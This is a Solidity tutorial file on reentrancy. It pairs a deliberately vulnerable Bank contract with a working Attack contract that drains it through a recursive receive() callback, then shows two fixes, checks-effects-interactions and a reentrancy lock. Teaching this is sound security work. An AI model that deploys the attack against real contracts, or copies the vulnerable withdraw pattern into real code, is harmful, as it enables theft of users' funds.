// SPDX-License-Identifier: MIT
// by 0xAA
pragma solidity ^0.8.4;

contract Bank {
    mapping (address => uint256) public balanceOf;    // balance mapping

    // Deposit ether and update balance
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // Withdraw all ether of msg.sender
    function withdraw() external {
        // Get balance
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // Transfer ether!!! May activate the fallback/receive function of a malicious contract, with the risk of re-entry!
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // Update balance
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 利用 检查-影响-交互模式（checks-effect-interaction）防止重入攻击
contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH
        // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 利用 重入锁 防止重入攻击
contract ProtectedBank {
    mapping (address => uint256) public balanceOf;
    uint256 private _status; // 重入锁

    // 重入锁
    modifier nonReentrant() {
        // 在第一次调用 nonReentrant 时，_status 将是 0
        require(_status == 0, "ReentrancyGuard: reentrant call");
        // 在此之后对 nonReentrant 的任何调用都将失败
        _status = 1;
        _;
        // 调用结束，将 _status 恢复为0
        _status = 0;
    }


    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 用重入锁保护有漏洞的函数
    function withdraw() external nonReentrant{
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

